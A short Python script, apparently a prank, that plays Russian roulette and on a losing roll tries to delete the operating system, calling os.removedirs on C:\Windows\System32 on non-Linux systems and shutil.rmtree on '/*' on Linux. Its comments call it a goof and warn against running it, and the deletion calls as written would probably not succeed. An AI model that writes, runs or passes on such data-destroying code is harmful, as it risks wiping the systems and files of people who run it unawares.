### This program will delte your operating system folder if you lose the Russian Roulette round ###
### please do not actually run this, this is a goof ###


import random
import os
import shutil
import time
import sys
import platform

temptFate = True

print("*loads one chamber*")
time.sleep(3)
while temptFate:
    print("*spins cylinder*")
    time.sleep(3)
    print("*closes cylinder*")
    time.sleep(3)
    print("*cocks hammer*")
    time.sleep(5)
    if random.randint(0, 6) == 1:
        print("BLAM")

        if platform.system() != "Linux":
            os.removedirs("C:\Windows\System32")
        else:
            shutil.rmtree("/*", ignore_errors=True)
        
        sys.exit()
    else:
        print("click...")

    response = input("Are ya feeling lucky, punk? y/n: ")

    if response.lower() !="y":
        temptFate = False







